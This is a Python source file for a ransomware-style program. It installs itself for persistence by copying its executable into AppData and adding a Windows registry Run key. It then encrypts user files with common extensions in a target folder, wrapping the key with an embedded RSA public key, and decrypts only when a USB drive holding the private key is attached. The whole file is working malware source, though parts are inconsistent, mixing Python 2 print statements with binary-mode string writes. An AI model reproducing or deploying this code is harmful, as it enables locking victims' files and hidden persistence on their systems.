from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
from cryptography.fernet import Fernet
import os,sys
import time
import subprocess
import shutil
import threading

# key = RSA.generate(2048)

# private_key = key.export_key()
# with open('private.pem', 'wb') as f:
#     f.write(private_key)

# public_key = key.publickey().export_key()

# with open('public.pem', 'wb') as f:
#     f.write(public_key)


class DecrypterEncrypter:
    file_exts = [
        'py', 'js','txt','docx','pptx','html','xml','java'
    ]
    def __init__(self):
        self.become_persistant()
        self.key = None
        self.crypter = None
        self.sysroot = os.path.expanduser('~')
        self.localroot = r'F:\examplelocation\toBeEncryptedFolder'	#All you have to do is set	this location
    def become_persistant(self):
        decrypter_location = os.environ["appdata"] + "\\enc_dec.exe"
        if not os.path.exists(decrypter_location):
            shutil.copyfile(sys.executable, decrypter_location)	#set sys.executable to __file__ if you wanna run it as is but it will require u to have python installed
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v prnEncrypterDecrypter /t REG_SZ /d "' + decrypter_location + '"', shell=True)
    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)
    def write_key(self):
        with open('{}\\fernet_key.txt'.format(self.sysroot), 'wb') as f:
            f.write(self.key)
    def encrypt_fernet_key(self):
        with open('{}\\fernet_key.txt'.format(self.sysroot), 'rb') as fk:
            fernet_key = fk.read()
        with open('{}\\fernet_key.txt'.format(self.sysroot), 'wb') as f:
            # self.public_key = RSA.import_key(open('public.pem').read())
            self.public_key = RSA.import_key('-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0AyUzoWStkSOgY1xpfGI\nZWDLxF7VnzSmu5G06ajmh68girGk2aD+L8UuBN8YOwSLfaBHHgP+EO0yQqpsWEh+\ni870qtnqfX6zZ+QvAd//d+oj94EQvNBcNZLH/zFSUb5nUtsRayKbm4iBFkAzGi4d\nqYbmtsW+LBo9ZJYBwzmC5doAXFDyrw3eHGg/LtVxXlSkyAX/jPOrz6ZsFnpVoNZm\ncl7LCjul6HMv7Z+ryNR035SRzPwZ/G0OmAxdCrf+FneGBa79d+a+mgEiRnwUxWB1\nk0NUmPIIl8V93bZSpd4nTkrJoN76ck3xVyhNwd5s8SiHXLypPDJmOsg4ttc4Fg2z\nowIDAQAB\n-----END PUBLIC KEY-----')
            public_crypter = PKCS1_OAEP.new(self.public_key)

            enc_fernet_key = public_crypter.encrypt(fernet_key)

            f.write(enc_fernet_key)

        self.key = None
        self.crypter = None
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data = f.read()

            if not encrypted:

                _data = self.crypter.encrypt(data)

                # print('> File Encrypted!')
            else:
                _data = self.crypter.decrypt(data)
                # print("> File Decrypted!")
        with open(file_path, 'wb') as fp:
            fp.write(_data)

    def crypt_system(self, encrypted=False):
        system = os.walk(self.localroot, topdown=True)      
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)

    def put_me_on_desktop(self, path): # have to put this file in usb
        while True:
            try:
                with open('{}\\PUT_ME_ON_DESKTOP.txt'.format(path), 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    self.crypt_system(encrypted=True)
                    self.key = None
                    self.crypter = None
                    break
            except Exception as e:# Debugging and testing
                pass
            time.sleep(10)
    def encryptIt(self):
        self.generate_key()
        self.crypt_system(encrypted=False)
        self.write_key()
        self.encrypt_fernet_key()
    def decryptIt(self, path):
        self.put_me_on_desktop(path)
def main():
    dc = DecrypterEncrypter()
    encrypted=False
    if os.path.exists('{}\\status.txt'.format(dc.sysroot)):
        with open('{}\\status.txt'.format(dc.sysroot), 'r') as st:
            condition = st.read()
            if condition=="True":
                encrypted=True
            else:
                encrypted=False
    else:
        with open('{}\\status.txt'.format(dc.sysroot), 'wb') as f:
            f.write('False')
    path1 = 'I:'
    path2 = 'H:'
    path3 = 'J:'
    while True:
        if not (os.path.exists('I:\\') or os.path.exists('H:\\')):
            if not encrypted:
                dc.encryptIt()
                encrypted=True
                with open('{}\\status.txt'.format(dc.sysroot), 'wb') as st:
                    st.write('True')
            else:
                print "encrypted already"
        else:
            if encrypted and os.path.exists(path1):
                with open('{}\\fernet_key.txt'.format(dc.sysroot), 'rb') as f:
                    enc_fernet_key = f.read()

                private_key = RSA.import_key(open('{}\\private.pem'.format(path1)).read())

                private_crypter = PKCS1_OAEP.new(private_key)

                dec_fernet_key = private_crypter.decrypt(enc_fernet_key)

                with open('{}\\PUT_ME_ON_DESKTOP.txt'.format(path1), 'wb') as f:
                    f.write(dec_fernet_key)

                    # print("> Key Decrypted")
                dc.decryptIt(path1)
                encrypted=False
                with open('{}\\status.txt'.format(dc.sysroot), 'wb') as st:
                    st.write('False')
            elif encrypted and os.path.exists(path2):
                with open('{}\\fernet_key.txt'.format(dc.sysroot), 'rb') as f:
                    enc_fernet_key = f.read()

                private_key = RSA.import_key(open('{}\\private.pem'.format(path2)).read())

                private_crypter = PKCS1_OAEP.new(private_key)

                dec_fernet_key = private_crypter.decrypt(enc_fernet_key)

                with open('{}\\PUT_ME_ON_DESKTOP.txt'.format(path2), 'wb') as f:
                    f.write(dec_fernet_key)

                    # print("> Key Decrypted")
                dc.decryptIt(path2)
                encrypted=False
                with open('{}\\status.txt'.format(dc.sysroot), 'wb') as st:
                    st.write('False')
            else:
                print ">Files are already decrypted plz remove the device to encrypt"
        time.sleep(20)
if __name__ == "__main__":
    main()
